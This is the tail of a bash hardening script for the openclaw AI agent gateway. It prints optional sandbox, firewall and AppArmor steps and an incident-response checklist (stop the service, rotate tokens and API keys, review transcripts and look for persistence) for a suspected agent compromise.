echo "     The legacy user-level gateway ($LEGACY_GATEWAY_STATE before this run) was"
echo "     stopped and disabled; nothing is serving until you run the command above."
fi
echo ""
if [[ "$WITH_SANDBOX" != true ]]; then
echo "  5. Consider enabling Docker sandbox for stronger isolation:"
echo "     sudo ./openclaw.sh -u $OC_USER --with-sandbox"
echo ""
fi
if [[ "$WITH_FIREWALL" != true ]]; then
echo "  6. Consider enabling nftables firewall rules:"
echo "     sudo ./openclaw.sh -u $OC_USER --with-firewall"
echo ""
fi
if [[ "$WITH_APPARMOR" != true ]]; then
echo "  7. Consider enabling AppArmor confinement:"
echo "     sudo ./openclaw.sh -u $OC_USER --with-apparmor"
echo ""
fi

echo -e "${C_RED}INCIDENT RESPONSE — Quick Reference:${C_NC}"
echo "  If you suspect the AI agent has been compromised:"
echo ""
echo "  1. STOP the gateway immediately:"
echo "     systemctl stop $GATEWAY_UNIT"
echo ""
echo "  2. Revoke the gateway token:"
echo "     Generate a new token and update $OC_ENV_FILE"
echo "     openssl rand -hex 32"
echo ""
echo "  3. Review session transcripts:"
echo "     ls -la $OC_DIR/agents/*/sessions/"
echo ""
echo "  4. Check for unauthorized file changes:"
echo "     cd $OC_WORKSPACE && git status && git diff"
echo ""
echo "  5. Rotate ALL API keys:"
echo "     Update ANTHROPIC_API_KEY and OPENAI_API_KEY in $OC_ENV_FILE"
echo ""
echo "  6. Run security audit:"
echo "     su - $OC_USER -c 'openclaw security audit --deep'"
echo ""
echo "  7. Check system for persistence mechanisms:"
echo "     crontab -l -u $OC_USER"
echo "     systemctl list-units 'openclaw-*'"
echo "     ls -la $OC_HOME/.config/systemd/user/   # units here run UNSANDBOXED as $OC_USER; expect none"
echo "     ls -la /tmp/ /var/tmp/"
echo ""
echo "  8. Review nftables/iptables for unauthorized rules:"
echo "     nft list ruleset"
echo ""

echo -e "${C_GREEN}Done. Full hardening log: $LOGFILE${C_NC}"
